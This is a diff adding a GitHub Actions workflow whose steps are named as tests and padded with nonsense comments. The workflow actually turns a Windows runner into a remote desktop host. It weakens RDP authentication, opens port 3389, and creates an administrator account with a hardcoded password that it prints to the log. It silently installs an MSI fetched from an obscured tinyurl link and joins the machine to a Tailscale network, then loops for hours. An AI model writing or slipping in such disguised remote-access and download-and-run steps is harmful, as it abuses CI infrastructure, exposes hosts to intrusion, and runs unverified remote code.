@@ -1,0 +1,124 @@
+name: Test 17
+
+
+on:
+  workflow_dispatch:
+
+
+jobs:
+  secure-MEDHAT:
+    runs-on: windows-latest
+    timeout-minutes: 340
+
+
+    steps:
+      - name: Test 22
+        run: |
+          # hi hi hi hi hi hi hi
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+
+          # go go go go go go go go go go
+          netsh advfirewall firewall delete rule name="MEDHAT-Tailscale"
+          
+          # fofo fo fo foffo  port 3389
+          netsh advfirewall firewall add rule name="MEDHAT-Tailscale" `
+            dir=in action=allow protocol=TCP localport=3389
+
+
+          # do do do do do do do do 
+          Restart-Service -Name TermService -Force
+
+
+      - name: Test 65
+        run: |
+          # sosososo so so os os os
+          $password = "Zxxz4444"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+
+
+          # aoao ao oao  ooa aoo oa oa oa oa o
+          $existing = Get-LocalUser -Name "MEDHAT" -ErrorAction SilentlyContinue
+          if ($existing) {
+              Set-LocalUser -Name "MEDHAT" -Password $securePass
+              Write-Host "Existing user 'MEDHAT' found. Password updated."
+          } else {
+              New-LocalUser -Name "MEDHAT" -Password $securePass -AccountNeverExpires
+              Add-LocalGroupMember -Group "Administrators" -Member "MEDHAT"
+              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "MEDHAT"
+              Write-Host "User 'MEDHAT' created and added to Administrators and Remote Desktop Users."
+          }
+
+
+          # as sa sas a  sa as sa a sa sa  sa
+          echo "MEDHAT_CREDS=User: MEDHAT | Password: $password" >> $env:GITHUB_ENV
+
+
+          # fr fr fr rf rf r  f ffr fr
+          if (-not (Get-LocalUser -Name "MEDHAT")) {
+              Write-Error "User creation/check failed"
+              exit 1
+          }
+
+
+      - name: TESTT 62
+        run: |
+          $tsUrl = "https://tinyurl.com/dwonloadd4122"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+
+      - name: tEST 562
+        run: |
+          # Bring up Tailscale with the provided auth key and set a unique hostname
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.MMMEEEMEDHAT_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          
+          # Wait for Tailscale to assign an IP
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+      
+      - name: Test 51 Verify
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          
+          # dsadssadsa sad sd sda sad  sa aas  asd sda dsa   
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to MEDHAT port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+
+      - name: Test 54
+        run: |
+          Write-Host "`n=== MEDHAT ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: MEDHAT"
+          Write-Host "Password: $(echo $env:MEDHAT_CREDS)"
+          Write-Host "==================`n"
+          
+          # sad   d asd sa s sa a sd sad ds asd sad      d sd 
+          while ($true) {
+              Write-Host "[$(Get-Date)] MEDHAT Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 5000
+          }
